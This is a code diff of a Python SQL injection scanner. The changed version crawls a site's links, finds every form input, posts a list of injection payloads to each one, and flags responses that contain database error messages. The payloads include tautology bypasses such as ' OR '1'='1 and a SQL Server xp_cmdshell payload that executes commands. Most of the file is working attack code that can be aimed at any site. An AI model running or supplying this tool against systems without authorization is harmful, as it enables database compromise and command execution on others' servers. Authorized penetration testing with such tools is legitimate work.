@@ -1,75 +1,10 @@
 import requests
+from bs4 import BeautifulSoup
 
-class SQLInjectionTest:
-    def __init__(self, param_name, payload, error_messages):
-        """
-        Initialize the SQLInjectionTest object.
-
-        Parameters
-        ----------
-        param_name : str
-            The name of the parameter to test.
-        payload : str
-            The SQL injection payload to use.
-        error_messages : list
-            A list of common SQL error messages to detect.
-        """
-        self.param_name = param_name
-        self.payload = payload
-        self.error_messages = error_messages
-
-    def run_test(self, base_url):
-        """
-        Run the SQL injection test.
-
-        Parameters
-        ----------
-        base_url : str
-            The base URL of the website to test.
-
-        Returns
-        -------
-        bool
-            True if the parameter is likely vulnerable, False otherwise.
-        """
-        print(f"Testing {self.param_name} for SQL injection with payload: {self.payload}")
-        vulnerable = False
-        target_url = f"{base_url}?{self.param_name}={self.payload}"
-        print(f"Requesting URL: {target_url}")
-        response = requests.get(target_url)
-
-        for error in self.error_messages:
-            if error.lower() in response.text.lower():
-                print(f"Potential SQL Injection Vulnerability found with payload: {self.payload}")
-                vulnerable = True
-                break
-
-        if not vulnerable:
-            print(f"No SQL Injection vulnerability detected with payload: {self.payload}")
-
-        return vulnerable
-
-
-class SecurityTester:
+class SQLInjectionTester:
     def __init__(self, base_url):
-        """
-        Initialize the SecurityTester object.
-
-        Parameters
-        ----------
-        base_url : str
-            The base URL of the website to test.
-        """
         self.base_url = base_url
-        self.error_messages = [
-            "you have an error in your sql syntax;",
-            "unclosed quotation mark after the character string",
-            "warning: mysql",
-            "ORA-00933",  # Oracle SQL error
-            "SQLSTATE[42000]",  # MySQL SQL error
-            "syntax error",  # Generic SQL syntax error
-            "Microsoft OLE DB Provider for SQL Server"  # MS SQL Server error
-        ]
+        self.session = requests.Session()
         self.sql_payloads = [
             "' OR '1'='1",  # Classic SQL Injection
             "' OR '1'='1' --",  # SQL Injection with comment
@@ -82,29 +17,70 @@ class SecurityTester:
             "' AND 1=2 --",  # SQL Injection with contradiction
             "'; EXEC xp_cmdshell('dir'); --",  # SQL Server command execution
         ]
+        self.error_messages = [
+            "you have an error in your sql syntax;",
+            "unclosed quotation mark after the character string",
+            "warning: mysql",
+            "ORA-00933",  # Oracle SQL error
+            "SQLSTATE[42000]",  # MySQL SQL error
+            "syntax error",  # Generic SQL syntax error
+            "Microsoft OLE DB Provider for SQL Server"  # MS SQL Server error
+        ]
 
-    def add_custom_payload(self, payload):
+    def fetch_links(self):
         """
-        Add a custom SQL injection payload to the test suite.
+        Fetches all the links from the base URL to iterate through the website's pages.
+        """
+        response = self.session.get(self.base_url)
+        soup = BeautifulSoup(response.text, 'html.parser')
+        links = set()
+        for a_tag in soup.find_all('a', href=True):
+            url = a_tag['href']
+            if url.startswith('/'):
+                url = self.base_url + url
+            if self.base_url in url:
+                links.add(url)
+        return links
 
-        Parameters
-        ----------
-        payload : str
-            The custom SQL injection payload to add.
+    def test_input_boxes(self, url):
         """
-        self.sql_payloads.append(payload)
+        Test all input boxes on a given page for SQL injection vulnerabilities.
+        """
+        print(f"Testing page: {url}")
+        response = self.session.get(url)
+        soup = BeautifulSoup(response.text, 'html.parser')
+        forms = soup.find_all('form')
 
-    def run_all_tests(self):
+        for form in forms:
+            form_action = form.get('action')
+            if not form_action.startswith('http'):
+                form_action = self.base_url + form_action
+            
+            inputs = form.find_all('input')
+            for input_tag in inputs:
+                input_name = input_tag.get('name')
+                if input_name:
+                    for payload in self.sql_payloads:
+                        data = {input_name: payload}
+                        print(f"Submitting form {form_action} with payload {payload}")
+                        res = self.session.post(form_action, data=data)
+
+                        for error in self.error_messages:
+                            if error.lower() in res.text.lower():
+                                print(f"Potential SQL Injection Vulnerability found on {url} with payload: {payload}")
+                                break
+
+    def run_tests(self):
         """
-        Run all SQL injection tests.
+        Run SQL injection tests on all pages and input boxes of the website.
         """
-        for payload in self.sql_payloads:
-            test = SQLInjectionTest(param_name="id", payload=payload, error_messages=self.error_messages)
-            test.run_test(self.base_url)
+        links = self.fetch_links()
+        for link in links:
+            self.test_input_boxes(link)
 
 
 # EXAMPLE USAGE
 if __name__ == "__main__":
-    # Replace 'http://example.com/page' with the actual URL to test
-    tester = SecurityTester("http://example.com/page")
-    tester.run_all_tests()
+    # Replace 'http://example.com' with the actual base URL to test
+    tester = SQLInjectionTester("http://example.com")
+    tester.run_tests()
